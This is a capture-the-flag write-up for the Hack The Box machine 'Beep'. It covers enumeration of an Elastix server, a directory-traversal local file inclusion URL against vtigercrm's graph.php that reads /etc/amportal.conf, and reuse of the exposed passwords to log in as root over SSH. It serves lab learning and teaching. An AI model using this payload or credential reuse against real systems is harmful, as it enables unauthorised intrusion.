Beep is a box that requires a good amount of initial enumeration as there are lots of services running on the system. However, knowing how to enumerate each of the servies well and doing some research on the public facing services, one is able to get intial access and later pivot to a root user. This writeup goes over going from no initial access, to getting an initial shell, to getting root. 

### Enumeration

Starting off with a standard enumeration scan: ```nmap -sC -sV -oA beep 10.10.10.7```:

![image](https://user-images.githubusercontent.com/41026969/72547292-5e634e80-385a-11ea-9ee7-b2f22af28ee2.png)

Off the bat, we see there's a lot of open ports. Most notably:

- Port 22 which hosts an SSH server
- Port 80 which hosts some kind of webserver
- Port 443 which hosts some kind of secured webserver (HTTPS)

Visiting the mainpage:

![image](https://user-images.githubusercontent.com/41026969/72669304-298ffc80-39fe-11ea-8196-e0ec5b047f58.png)

We see there's an ```Elastix``` login page. Doing some research on what elastix is, I learn from the [wiki page](https://en.wikipedia.org/wiki/Elastix) that ```Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality.``` So this explains all the open ports.

Next I run a ```gobuster``` scan to find any directories or extra files that are open to us: ```gobuster  -u https://10.10.10.7 dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k```.

##### Note: I learned that you need to do the ```-k``` flag to disable certificate checking. 

Here's what gobuster found:

![image](https://user-images.githubusercontent.com/41026969/72669457-d028cd00-39ff-11ea-90b9-41c31aba952c.png)

Going through each of those directories found, there a few interesting ones:
- ```/mail``` leads to a ```roundcube``` login page.
- ```/admin``` leads to a ```FreePBX``` administrator login page. We see the version is 2.8.1.4
- ```/vtigercrm``` leads to a ```vtiger CRM``` login page. We see the version is 5.1.0

Next, I do a searchsploit for Elastix: ```searchsploit Elastix | grep -v "Cross-Site"```. I do ```grep -v "Cross-Site"``` to get rid of the results that use XSS because we need an end user. Here's the results:

![image](https://user-images.githubusercontent.com/41026969/72669919-aecadf80-3a05-11ea-8d99-5d84b39d67b5.png)

### Exploitation

Of the results there are a few interesting options, one of which is the ```Elastix 2.2.0 - 'graph.php' Local File Inclusion```. More information is located at ```/usr/share/exploitdb/exploits/php/webapps/37637.pl```.

Previous to this challenge, I was unfamiliar with that a ```Local File Inclusion``` was. From the [OWASP Wiki](https://wiki.owasp.org/index.php/Testing_for_Local_File_Inclusion) I learned that ```The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation... Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. ```

So basically since it fails to check/sanitize what we put in the URL, we can do some directory traversal to do further enumeration.

From the searchsploit file found above (```/usr/share/exploitdb/exploits/php/webapps/37637.pl```) we see that the LFI exploit is: ```https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action```.

Going to that webpage:

![image](https://user-images.githubusercontent.com/41026969/72670011-55af7b80-3a06-11ea-80dc-f4300096b455.png)

We see the page displaying the contents of that file. We can do ```CTRL + U``` to view the raw page source so it's in a better format (since the page is trying to dispaly it as HTML).

![image](https://user-images.githubusercontent.com/41026969/72670026-80013900-3a06-11ea-8f6d-70f05c562b36.png)

We see a few plaintext credentials:

```
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

```
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```
There are 4 passwords we can try to login with. We see there's a match above with ```AMPMGRUSER``` and ```AMPMGRPASS``` of ```admin:jEhdIekWmdjE```. Trying it on the webpage we get through the login page!

![image](https://user-images.githubusercontent.com/41026969/72670089-5dbbeb00-3a07-11ea-8e39-a94731e34e30.png)

I couldn't find anything really interesting on this page. Trying the credentials at the ssh login:

```admin:jEhdIekWmdjE``` ended up not working.

Though trying ```root:jEhdIekWmdjE```:

![image](https://user-images.githubusercontent.com/41026969/72670110-a4114a00-3a07-11ea-9ac4-e8e276bad65e.png)

Doing an ```ls -la``` check to see all the files of the directory we are currently on, we find the ```root.txt``` file. Looking around, in the ```/home``` directory we see another user: ```fanis```. Checking his/her home directory we find the user flag!

### Flags
user: ```/home/fanis/user.txt```

root: ```/root/root.txt```

### Sources
- [wiki page on Elastix](https://en.wikipedia.org/wiki/Elastix)
- [OWASP Local File Inclusion](https://wiki.o